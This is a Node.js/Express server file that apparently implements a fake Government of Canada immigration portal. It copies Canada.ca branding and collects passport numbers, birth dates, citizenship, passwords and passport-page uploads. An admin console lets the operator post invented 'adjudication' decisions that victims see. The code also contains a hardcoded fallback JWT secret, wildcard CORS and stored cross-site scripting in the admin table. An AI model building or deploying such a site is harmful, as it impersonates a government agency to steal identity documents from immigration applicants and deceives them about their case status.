const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const multer = require('multer');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

const app = express();
const PORT = process.env.PORT || 5000;
const JWT_SECRET = process.env.JWT_SECRET || 'SYS_SECRET_CORE_NODE_FALLBACK';

// MIDDLEWARE PIPELINE
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// MULTIPART FILE BUFFER ALLOCATION
const storage = multer.memoryStorage();
const upload = multer({ 
    storage: storage,
    limits: { fileSize: 10 * 1024 * 1024 } // 10MB Maximum upload payload
});

// DATABASE CONNECTION
const fallbackURI = "mongodb+srv://testuser:testpass@cluster0.mongodb.net/immigration?retryWrites=true&w=majority";
const MONGO_URI = process.env.MONGO_URI || fallbackURI;

mongoose.connect(MONGO_URI)
  .then(() => console.log('🚀 Database Node Connected Successfully'))
  .catch(err => console.error('❌ Database Initialization Warning:', err.message));

// DATA SCHEMA
const UserSchema = new mongoose.Schema({
    name: { type: String, required: true },
    email: { type: String, required: true, unique: true, lowercase: true },
    password: { type: String, required: true },
    dob: { type: String, default: '' },
    gender: { type: String, default: '' },
    citizenship: { type: String, default: '' },
    passportNumber: { type: String, default: '' },
    residence: { type: String, default: '' },
    phone: { type: String, default: '' },
    role: { type: String, enum: ['user', 'admin'], default: 'user' },
    uciNumber: { type: String, unique: true },
    trackingRef: { type: String, unique: true },
    status: { type: String, default: 'Submitted / Review Pending' },
    adminNotes: { type: String, default: 'Your application file is undergoing preliminary verification.' },
    attachedFile: { type: String, default: '' },     // Base64 string
    attachedFileName: { type: String, default: '' }, 
    attachedMimeType: { type: String, default: '' }, 
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.models.User || mongoose.model('User', UserSchema);

// ==========================================
// API TRANSACTION LOGIC ENDPOINTS
// ==========================================

app.post('/api/auth/register', upload.single('clientDocument'), async (req, res) => {
    try {
        const { name, email, password, dob, gender, citizenship, passportNumber, residence, phone } = req.body;
        if (!name || !email || !password) return res.status(400).json({ error: 'Primary fields missing.' });

        const existingUser = await User.findOne({ email: email.toLowerCase().trim() });
        if (existingUser) return res.status(409).json({ error: 'Account already registered.' });

        const salt = await bcrypt.genSalt(10);
        const hashedPassword = await bcrypt.hash(password, salt);

        const uciNumber = "UCI-" + Math.floor(10000000 + Math.random() * 90000000);
        const trackingRef = "CAN-" + Math.floor(100000 + Math.random() * 900000) + "-REG";

        const systemAdminEmail = (process.env.SYSTEM_ADMIN_EMAIL || 'admin@portal.com').toLowerCase().trim();
        const role = (email.toLowerCase().trim() === systemAdminEmail) ? 'admin' : 'user';

        let attachedFile = '';
        let attachedFileName = '';
        let attachedMimeType = '';

        if (req.file) {
            attachedFile = req.file.buffer.toString('base64');
            attachedFileName = req.file.originalname;
            attachedMimeType = req.file.mimetype;
        }

        const newUser = new User({
            name, email: email.toLowerCase().trim(), password: hashedPassword,
            dob, gender, citizenship, passportNumber, residence, phone, role, uciNumber, trackingRef,
            attachedFile, attachedFileName, attachedMimeType
        });

        await newUser.save();
        res.status(201).json({ success: true, uciNumber, trackingRef });
    } catch (error) {
        res.status(500).json({ error: 'Registration pipeline failure.' });
    }
});

app.post('/api/auth/login', async (req, res) => {
    try {
        const { email, password } = req.body;
        const user = await User.findOne({ email: email.trim().toLowerCase() });
        if (!user) return res.status(401).json({ error: 'Invalid credentials.' });

        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) return res.status(401).json({ error: 'Invalid credentials.' });

        const token = jwt.sign({ id: user._id, role: user.role, name: user.name }, JWT_SECRET, { expiresIn: '2h' });
        res.json({ success: true, token, role: user.role, name: user.name, uciNumber: user.uciNumber, trackingRef: user.trackingRef });
    } catch (error) {
        res.status(500).json({ error: 'Login verification error.' });
    }
});

app.post('/api/auth/track', async (req, res) => {
    try {
        const record = await User.findOne({ uciNumber: req.body.uciNumber.trim() });
        if (!record) return res.status(404).json({ error: 'No matching records found.' });
        res.json({ name: record.name, status: record.status, adminNotes: record.adminNotes });
    } catch (error) {
        res.status(500).json({ error: 'Query execution error.' });
    }
});

const checkAdmin = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Missing token.' });
    jwt.verify(token, JWT_SECRET, (err, decoded) => {
        if (err || decoded.role !== 'admin') return res.status(403).json({ error: 'Unauthorized configuration clearance.' });
        req.user = decoded;
        next();
    });
};

app.get('/api/admin/enrollments', checkAdmin, async (req, res) => {
    res.json(await User.find().sort({ createdAt: -1 }));
});

app.post('/api/admin/decision', checkAdmin, async (req, res) => {
    try {
        await User.findByIdAndUpdate(req.body.id, { 
            status: req.body.status, 
            adminNotes: req.body.adminNotes 
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to update decision' });
    }
});

app.delete('/api/admin/user/:id', checkAdmin, async (req, res) => {
    await User.findByIdAndDelete(req.params.id);
    res.json({ success: true });
});

// ==========================================
// HIGH-FIDELITY OFFICIAL ADMIN CONSOLE
// ==========================================
app.get('/admin', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>🔒 Case Management Decision Console - Canada.ca</title>
        <style>
            body { font-family: "Noto Sans", sans-serif; background-color: #f9f9f9; color: #333; margin: 0; padding: 0; }
            .gov-header { background: #fff; border-bottom: 2px solid #e16262; padding: 15px 40px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
            .brand-text { font-size: 22px; font-weight: 700; color: #333; font-family: "Helvetica Neue", Helvetica, sans-serif;}
            .red-flag { color: #c8102e; }
            .box { max-width: 1500px; margin: 30px auto; background: white; padding: 30px; border: 1px solid #dcdee1; box-shadow: 0 4px 12px rgba(0,0,0,0.03); }
            h2 { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; border-bottom: 2px solid #333; padding-bottom: 12px; color: #222; margin-top: 0; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { padding: 14px; text-align: left; border-bottom: 1px solid #dcdcdc; font-size: 14px; vertical-align: top; }
            th { background: #26374a; color: white; font-weight: 600; }
            tr:nth-child(even) { background: #f8fafc; }
            
            /* Status Badge Styles */
            .badge { display: inline-block; padding: 4px 8px; font-weight: bold; font-size: 11px; border-radius: 3px; text-transform: uppercase; margin-bottom: 5px; }
            .badge-pending { background: #f0ad4e; color: #fff; }
            .badge-active { background: #0275d8; color: #fff; }
            .badge-approved { background: #5cb85c; color: #fff; }
            .badge-refused { background: #d9534f; color: #fff; }

            .save-btn { background: #264a28; color: white; border: none; padding: 8px 14px; cursor: pointer; font-weight: bold; width: 100%; margin-bottom: 6px; border-radius: 4px; border-bottom: 2px solid #142815; }
            .save-btn:hover { background: #19331b; }
            .del-btn { background: #bc1c1c; color: white; border: none; padding: 6px 14px; cursor: pointer; font-size: 12px; width: 100%; border-radius: 4px; }
            .file-btn { display: inline-block; background: #2572b4; color: white; text-decoration: none; padding: 6px 12px; font-size: 12px; font-weight: bold; margin-top: 5px; border-radius: 4px; text-align: center; border-bottom: 2px solid #184b78; }
            .file-btn:hover { background: #184b78; }
            
            select, textarea { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #767676; border-radius: 4px; font-size: 13px; }
            textarea { resize: vertical; }

            /* Image Preview Modal */
            .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); justify-content: center; align-items: center; }
            .modal-content { background: white; padding: 20px; max-width: 80%; max-height: 80%; overflow: auto; border-radius: 4px; text-align: center; }
            .modal-close { background: #333; color: white; border: none; padding: 8px 16px; cursor: pointer; margin-top: 15px; font-weight: bold; border-radius: 4px; }
        </style>
    </head>
    <body>
        <div class="gov-header">
            <div class="brand-text">Government of Can<span class="red-flag">ada</span> — Case Officer Core</div>
            <button onclick="localStorage.clear(); window.location.href='/'" style="padding:8px 16px; background:#333; color:#fff; border:none; cursor:pointer; font-weight:bold; border-radius:4px;">Sign Out</button>
        </div>
        
        <div class="box">
            <h2>📋 Document Under Review & System Adjudication Terminal</h2>
            <p style="margin-top:-5px; color:#555;">Review client profile metrics, inspect data payloads, update application status vectors, and issue adjudication text lines in real-time.</p>
            
            <table>
                <thead>
                    <tr>
                        <th style="width:22%;">Applicant Identity Metrics</th>
                        <th style="width:20%;">Uploaded Payload Node</th>
                        <th style="width:18%;">Registry Identifiers</th>
                        <th style="width:18%;">Adjudication Decision</th>
                        <th style="width:14%;">Case Officer Remarks</th>
                        <th style="width:10%;">Directives</th>
                    </tr>
                </thead>
                <tbody id="rows"><tr><td colspan="6" style="text-align:center;">Querying Secure Database Streams...</td></tr></tbody>
            </table>
        </div>

        <div id="fileModal" class="modal">
            <div class="modal-content">
                <h3 id="modalTitle" style="margin-top:0; color:#26374a;">Document Viewer</h3>
                <div id="modalBody"></div>
                <button class="modal-close" onclick="closeModal()">Close Document Window</button>
            </div>
        </div>

        <script>
            const token = localStorage.getItem('adminToken');
            if (!token || localStorage.getItem('userRole') !== 'admin') { window.location.href = '/'; }

            async function loadGrid() {
                const res = await fetch('/api/admin/enrollments', { headers: { 'Authorization': 'Bearer ' + token } });
                if (!res.ok) { window.location.href='/'; return; }
                const users = await res.json();
                const tbody = document.getElementById('rows');
                tbody.innerHTML = '';
                
                users.forEach(u => {
                    const tr = document.createElement('tr');
                    
                    // Dynamic status styling badge
                    let badgeClass = 'badge-pending';
                    if(u.status.includes('Approved')) badgeClass = 'badge-approved';
                    if(u.status.includes('Refusal')) badgeClass = 'badge-refused';
                    if(u.status.includes('Active') || u.status.includes('Biometrics')) badgeClass = 'badge-active';

                    // Document interactive processing node
                    let fileSectionHtml = '<span style="color:#777; font-style:italic;">No attachment submitted</span>';
                    if (u.attachedFile) {
                        const isImg = u.attachedMimeType.includes('image');
                        fileSectionHtml = \`
                            <div>
                                📁 <span style="font-size:12px; font-weight:bold; color:#222;">\${u.attachedFileName}</span><br>
                                <button class="file-btn" onclick="viewFile('\${u.attachedFile}', '\${u.attachedMimeType}', '\${u.attachedFileName}')">🔎 Inspect Document</button>
                                <a class="file-btn" style="background:#555; border-bottom-color:#333;" href="data:\${u.attachedMimeType};base64,\${u.attachedFile}" download="\${u.attachedFileName}">💾 Download</a>
                            </div>
                        \`;
                    }

                    tr.innerHTML = \`
                        <td>
                            <strong>\${u.name}</strong><br>
                            <span style="font-size:12px; color:#555; line-height:1.4;">
                                Email: <code>\${u.email}</code><br>
                                Birthdate: \${u.dob || 'N/A'}<br>
                                Gender Metric: \${u.gender || 'N/A'}<br>
                                Citizenship: <strong>\${u.citizenship || 'N/A'}</strong>
                            </span>
                        </td>
                        <td>\${fileSectionHtml}</td>
                        <td>
                            <span class="badge \${badgeClass}">\${u.status}</span><br>
                            UCI ID: <code>\${u.uciNumber || 'N/A'}</code><br>
                            Ref Key: <code>\${u.trackingRef || 'N/A'}</code><br>
                            Passport Serial: <strong>\${u.passportNumber || 'N/A'}</strong>
                        </td>
                        <td>
                            <label style="font-size:11px; font-weight:bold; color:#555;">Adjudication Vector Selection:</label>
                            <select id="s-\${u._id}" style="margin-top:3px;">
                                <option value="Submitted / Review Pending" \${u.status === 'Submitted / Review Pending'?'selected':''}>Submitted / Review Pending</option>
                                <option value="Under Active Officer Review" \${u.status === 'Under Active Officer Review'?'selected':''}>Under Active Officer Review</option>
                                <option value="Biometrics Verification Stage" \${u.status === 'Biometrics Verification Stage'?'selected':''}>Biometrics Verification Stage</option>
                                <option value="Background Eligibility Check" \${u.status === 'Background Eligibility Check'?'selected':''}>Background Eligibility Check</option>
                                <option value="Registry Profile Approved" \${u.status === 'Registry Profile Approved'?'selected':''}>Registry Profile Approved</option>
                                <option value="Refusal Issued" \${u.status === 'Refusal Issued'?'selected':''}>Refusal Issued</option>
                            </select>
                        </td>
                        <td>
                            <textarea id="n-\${u._id}" rows="4" placeholder="Enter official notes visible to applicant...">\${u.adminNotes || ''}</textarea>
                        </td>
                        <td>
                            <button class="save-btn" onclick="save('\${u._id}')">Commit</button>
                            <button class="del-btn" onclick="del('\${u._id}')">Purge File</button>
                        </td>
                    \`;
                    tbody.appendChild(tr);
                });
            }

            // Document Lightbox Inspector Mechanism
            function viewFile(base64, mime, filename) {
                const modal = document.getElementById('fileModal');
                const title = document.getElementById('modalTitle');
                const body = document.getElementById('modalBody');
                title.innerText = "Reviewing Document: " + filename;
                
                if (mime.includes('image')) {
                    body.innerHTML = \`<img src="data:\${mime};base64,\${base64}" style="max-width:100%; border:1px solid #ccc; box-shadow:0 2px 8px rgba(0,0,0,0.15);">\`;
                } else if (mime.includes('pdf')) {
                    body.innerHTML = \`<iframe src="data:\${mime};base64,\${base64}" style="width:100%; height:500px; border:none;"></iframe>\`;
                } else {
                    body.innerHTML = \`<p style="padding:20px; background:#f5f5f5;">Binary data file string formatted. Preview unsupported for this MIME. Click the download button to review manually.</p>\`;
                }
                modal.style.display = 'flex';
            }

            function closeModal() { document.getElementById('fileModal').style.display = 'none'; }

            async function save(id) {
                const status = document.getElementById('s-'+id).value;
                const adminNotes = document.getElementById('n-'+id).value;
                const res = await fetch('/api/admin/decision', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
                    body: JSON.stringify({ id, status, adminNotes })
                });
                if(res.ok) {
                    alert('🎉 Success: Decision vectors and notes committed to database cluster securely.');
                    loadGrid();
                } else { alert('Adjudication pipeline error.'); }
            }

            async function del(id) {
                if(confirm('🚨 WARNING: Purge application record permanently from data registry? This cannot be undone.')) {
                    await fetch('/api/admin/user/' + id, { method: 'DELETE', headers: { 'Authorization': 'Bearer ' + token } });
                    loadGrid();
                }
            }
            window.onload = loadGrid;
        </script>
    </body>
    </html>
    `);
});

// ==========================================
// OFFICIAL CANADA.CA USER INTERFACE
// ==========================================
app.get('*', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Immigration and citizenship - Canada.ca</title>
        <style>
            body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #ffffff; color: #333333; margin: 0; padding: 0; font-size: 16px; line-height: 1.4375; }
            .top-utility { background-color: #26374a; padding: 8px 40px; display: flex; justify-content: flex-end; }
            .top-utility a { color: #ffffff; text-decoration: none; font-size: 13px; font-weight: 600; }
            .top-utility a:hover { text-decoration: underline; }
            .gov-brand-bar { padding: 25px 40px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e1e4e7; background: #ffffff; }
            .signature-logo { font-size: 26px; font-weight: bold; color: #000000; letter-spacing: -1px; }
            .signature-logo span { color: #c8102e; font-weight: 800; }
            .wordmark-visual { font-family: "Georgia", serif; font-size: 22px; color: #555; font-weight: bold; }
            .wordmark-visual span { color: #c8102e; }
            .search-box-mock { display: flex; align-items: center; background: #f5f5f5; border: 1px solid #ccc; padding: 6px 12px; border-radius: 4px; font-size: 14px; color: #666; width: 240px; }
            .red-accent-strip { background-color: #c8102e; height: 4px; width: 100%; }
            .breadcrumbs { padding: 12px 40px; background-color: #f5f5f5; font-size: 14px; color: #555; border-bottom: 1px solid #e1e4e7; }
            .breadcrumbs span { margin: 0 8px; color: #999; }
            .breadcrumbs a { color: #2572b4; text-decoration: none; }
            .main-content { max-width: 1140px; margin: 30px auto; padding: 0 40px; }
            h1 { font-size: 38px; border-bottom: 1px solid #afb7c0; padding-bottom: 12px; margin-top: 0; margin-bottom: 24px; font-weight: 700; color: #222222; }
            h2 { font-size: 24px; color: #26374a; margin-top: 0; margin-bottom: 20px; font-weight: 700; border-bottom: 1px solid #eaebed; padding-bottom: 8px; }
            h3 { font-size: 18px; color: #333; margin-top: 25px; margin-bottom: 15px; border-bottom: 1px solid #eeeeee; padding-bottom: 6px; font-weight: 700; }
            p.lead-text { font-size: 18px; color: #555; margin-bottom: 25px; }
            .wet-tabs { display: flex; background: #eaebed; padding: 6px; border-radius: 4px; margin-bottom: 30px; border: 1px solid #dcdee1; }
            .wet-tabs button { padding: 12px 24px; background: transparent; border: none; font-size: 15px; font-weight: bold; cursor: pointer; color: #26374a; border-radius: 4px; }
            .wet-tabs button.active { background: #26374a; color: #ffffff; }
            .portal-panel { display: none; background: #ffffff; border: 1px solid #dcdcdc; border-radius: 4px; padding: 30px; box-shadow: 0 2px 6px rgba(0,0,0,0.03); }
            .portal-panel.active { display: block; }
            .form-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 20px; }
            @media (max-width: 900px) { .form-grid { grid-template-columns: repeat(2, 1fr); } }
            @media (max-width: 600px) { .form-grid { grid-template-columns: 1fr; } }
            .input-group { display: flex; flex-direction: column; }
            label { font-size: 15px; font-weight: 600; margin-bottom: 6px; color: #333333; }
            .required-mark { color: #bc1c1c; font-weight: bold; }
            input, select { padding: 8px 12px; border: 1px solid #444444; font-size: 15px; border-radius: 4px; width: 100%; box-sizing: border-box; background-color: #ffffff; color: #333333; height: 40px; }
            input[type="file"] { border: 2px dashed #26374a; background: #fafafa; padding: 6px; cursor: pointer; height: auto; }
            .btn-primary { padding: 11px 24px; background-color: #2572b4; color: #ffffff; border: 1px solid #2369a5; font-size: 16px; font-weight: 700; cursor: pointer; border-radius: 4px; border-bottom: 3px solid #1b5180; }
            .btn-primary:hover { background-color: #1b5180; text-decoration: underline; }
            .status-display-card { display: none; margin-top: 30px; padding: 25px; border-left: 6px solid #bc1c1c; background-color: #fcf8f8; border-top: 1px solid #e3cbcb; border-right: 1px solid #e3cbcb; border-bottom: 1px solid #e3cbcb; border-radius: 4px; }
            .gov-footer { background-color: #26374a; color: #ffffff; padding: 40px; margin-top: 60px; font-size: 14px; }
            .footer-links { max-width: 1140px; margin: 0 auto; display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; }
            .footer-column h4 { font-size: 16px; font-weight: 700; border-bottom: 1px solid #3f566e; padding-bottom: 8px; margin-top: 0; color: #ffffff; }
            .footer-column ul { list-style: none; padding: 0; margin: 0; }
            .footer-column ul li { margin-bottom: 10px; }
            .footer-column ul li a { color: #ffffff; text-decoration: none; }
            .footer-sub-strip { max-width: 1140px; margin: 30px auto 0 auto; padding-top: 20px; border-top: 1px solid #3f566e; display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #ccd5df; }
        </style>
    </head>
    <body>
        <div class="top-utility"><a href="#">Français</a></div>
        <div class="gov-brand-bar">
            <div class="signature-logo">Gov<span>ernment</span> of Canada</div>
            <div class="search-box-mock">Search Canada.ca 🔍</div>
        </div>
        <div class="red-accent-strip"></div>
        <div class="breadcrumbs"><a href="#">Home</a><span>&gt;</span><a href="#">Immigration, Refugees and Citizenship</a><span>&gt;</span>Active Registry Portal Terminal</div>
        
        <div class="main-content">
            <h1>Immigration and Secure Client Portal Terminal</h1>
            <p class="lead-text">Access your personal security enrollment profile, transmit legal digital document payload attachments, and safely monitor deployment evaluation updates in real-time.</p>
            
            <div class="wet-tabs">
                <button type="button" id="btn-login" class="active" onclick="setView('loginPanel', 'btn-login')">Access Existing Account</button>
                <button type="button" id="btn-register" onclick="setView('registerPanel', 'btn-register')">Create Secure Account Profiling File</button>
                <button type="button" id="btn-track" onclick="setView('trackPanel', 'btn-track')">Track File Status</button>
            </div>

            <div id="loginPanel" class="portal-panel active">
                <h2>Account Secure Gateway Sign-In</h2>
                <form id="lForm">
                    <div style="max-width: 440px;">
                        <div class="input-group" style="margin-bottom:18px;">
                            <label>Email Address <span class="required-mark">*</span></label>
                            <input type="email" id="lEmail" required autocomplete="email">
                        </div>
                        <div class="input-group" style="margin-bottom:20px;">
                            <label>Account Security Password <span class="required-mark">*</span></label>
                            <input type="password" id="lPass" required autocomplete="current-password">
                        </div>
                        <button type="submit" class="btn-primary">Verify and Sign In</button>
                    </div>
                </form>
            </div>

            <div id="registerPanel" class="portal-panel">
                <h2>Secure System Enrollment Registry Profile</h2>
                <form id="rForm" enctype="multipart/form-data">
                    <h3>Personal Identification Parameters Matrix</h3>
                    <div class="form-grid">
                        <div class="input-group">
                            <label>Legal Full Name <span class="required-mark">*</span></label>
                            <input type="text" id="rName" required placeholder="As written in Passport Document">
                        </div>
                        <div class="input-group">
                            <label>Date of Birth <span class="required-mark">*</span></label>
                            <input type="date" id="rDob" required>
                        </div>
                        <div class="input-group">
                            <label>Gender File Metric <span class="required-mark">*</span></label>
                            <select id="rGender">
                                <option value="Male">Male</option>
                                <option value="Female">Female</option>
                                <option value="Other">Other</option>
                            </select>
                        </div>
                        <div class="input-group">
                            <label>Country of Citizenship Nationality <span class="required-mark">*</span></label>
                            <input type="text" id="rCitizenship" required placeholder="e.g. France">
                        </div>
                        <div class="input-group">
                            <label>Passport Serial Key Number <span class="required-mark">*</span></label>
                            <input type="text" id="rPassport" required placeholder="e.g. AA123456">
                        </div>
                        <div class="input-group">
                            <label>Current Legal Country of Residence <span class="required-mark">*</span></label>
                            <input type="text" id="rResidence" required placeholder="e.g. United Kingdom">
                        </div>
                    </div>

                    <h3>Contact Parameters & Access Framework</h3>
                    <div class="form-grid">
                        <div class="input-group">
                            <label>Primary Telephone Contact <span class="required-mark">*</span></label>
                            <input type="tel" id="rPhone" required placeholder="e.g. +1 555-0199">
                        </div>
                        <div class="input-group">
                            <label>Email Access Point <span class="required-mark">*</span></label>
                            <input type="email" id="rEmail" required placeholder="e.g. user@domain.com">
                        </div>
                        <div class="input-group">
                            <label>Create Security Password <span class="required-mark">*</span></label>
                            <input type="password" id="rPass" required placeholder="Minimum 8 characters">
                        </div>
                    </div>

                    <h3>Primary Digital Identification Documentation Attachment Subsystem</h3>
                    <div style="max-width: 550px; margin-bottom: 25px;">
                        <div class="input-group">
                            <label style="margin-bottom:8px;">Upload Passport Data Page / Identity Certificate <span class="required-mark">*</span></label>
                            <input type="file" id="rFile" name="clientDocument" accept=".pdf,.png,.jpg,.jpeg" required>
                        </div>
                    </div>

                    <button type="submit" class="btn-primary">Execute Processing Enrollment Registry</button>
                </form>
            </div>

            <div id="trackPanel" class="portal-panel">
                <h2>File Status Tracking Archive Gateway</h2>
                <form id="tForm">
                    <div style="max-width:440px;">
                        <div class="input-group" style="margin-bottom:20px;">
                            <label>Unique Client ID (UCI)</label>
                            <input type="text" id="tUci" placeholder="UCI-XXXXXXXX" required>
                        </div>
                        <button type="submit" class="btn-primary">Query Directory Archives</button>
                    </div>
                </form>
                <div id="tResult" class="status-display-card"></div>
            </div>
        </div>

        <div class="gov-footer">
            <div class="footer-links">
                <div class="footer-column">
                    <h4>Contact Government</h4>
                    <ul>
                        <li><a href="#">Contact Immigration Services</a></li>
                        <li><a href="#">Department Directory Offices</a></li>
                    </ul>
                </div>
                <div class="footer-column">
                    <h4>Government Transparency</h4>
                    <ul>
                        <li><a href="#">All Services Directory</a></li>
                        <li><a href="#">Privacy Framework Statements</a></li>
                    </ul>
                </div>
                <div class="footer-column">
                    <h4>Corporate Assets</h4>
                    <ul>
                        <li><a href="#">Terms and System Conditions</a></li>
                    </ul>
                </div>
            </div>
            <div class="footer-sub-strip">
                <div>Government of Canada Network</div>
                <div class="wordmark-visual">Can<span>ada</span></div>
            </div>
        </div>

        <script>
            function setView(panelId, btnId) {
                document.querySelectorAll('.portal-panel').forEach(p => p.classList.remove('active'));
                document.querySelectorAll('.wet-tabs button').forEach(b => b.classList.remove('active'));
                document.getElementById(panelId).classList.add('active');
                document.getElementById(btnId).classList.add('active');
            }

            document.getElementById('rForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const btn = e.target.querySelector('.btn-primary');
                btn.innerText = "Transmitting Packet Attachments to Registry...";
                btn.disabled = true;

                const formData = new FormData();
                formData.append('name', document.getElementById('rName').value);
                formData.append('dob', document.getElementById('rDob').value);
                formData.append('gender', document.getElementById('rGender').value);
                formData.append('citizenship', document.getElementById('rCitizenship').value);
                formData.append('passportNumber', document.getElementById('rPassport').value);
                formData.append('residence', document.getElementById('rResidence').value);
                formData.append('phone', document.getElementById('rPhone').value);
                formData.append('email', document.getElementById('rEmail').value);
                formData.append('password', document.getElementById('rPass').value);
                
                const fileInput = document.getElementById('rFile');
                if(fileInput.files.length > 0) formData.append('clientDocument', fileInput.files[0]);

                try {
                    const res = await fetch('/api/auth/register', { method: 'POST', body: formData });
                    const data = await res.json();
                    if(res.ok && data.success) {
                        alert('🎉 Profile File and Attachments Logged Successfully!\\n\\nUCI: ' + data.uciNumber + '\\nRef Code: ' + data.trackingRef);
                        document.getElementById('rForm').reset();
                        setView('loginPanel', 'btn-login');
                    } else { alert('Registration Exception: ' + data.error); }
                } catch(err) { alert('Failed to route upload tracking packet.'); }
                finally { btn.innerText = "Execute Processing Enrollment Registry"; btn.disabled = false; }
            });

            document.getElementById('lForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                try {
                    const res = await fetch('/api/auth/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            email: document.getElementById('lEmail').value,
                            password: document.getElementById('lPass').value
                        })
                    });
                    const data = await res.json();
                    if(res.ok && data.success) {
                        localStorage.setItem('adminToken', data.token);
                        localStorage.setItem('userRole', data.role);
                        if(data.role === 'admin') {
                            alert('🔑 Administrative Authorization Confirmed. Routing to Verification Console Grid...');
                            window.location.href = '/admin';
                        } else {
                            alert('Identity Access Granted!\\n\\nHolder profile: ' + data.name + '\\nUCI: ' + data.uciNumber + '\\nRef Key: ' + data.trackingRef);
                        }
                    } else { alert('Access Refused: ' + data.error); }
                } catch(err) { alert('Authentication connection error.'); }
            });

            document.getElementById('tForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                try {
                    const res = await fetch('/api/auth/track', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ uciNumber: document.getElementById('tUci').value })
                    });
                    const data = await res.json();
                    const out = document.getElementById('tResult');
                    if(res.ok) {
                        out.style.display = 'block';
                        out.innerHTML = '<h3 style="color:#bc1c1c; margin-top:0; border:none; padding:0;">File Identity Verified: ' + data.name + '</h3><p style="font-size:16px; margin:12px 0;"><strong>Active File Status Stream:</strong> <span style="color:#bc1c1c; font-weight:bold;">' + data.status + '</span></p><p style="color:#444; font-size:15px; background:#ffffff; padding:12px; border:1px solid #dcdcdc; line-height:1.5;"><strong>Official Case Officer Remarks:</strong> ' + data.adminNotes + '</p>';
                    } else { alert('Tracking Search Handle Not Found: ' + data.error); }
                } catch(err) { alert('Could not synchronize query stream.'); }
            });
        </script>
    </body>
    </html>
    `);
});

app.listen(PORT, () => console.log(`Server execution smoothly online on port \${PORT}`));
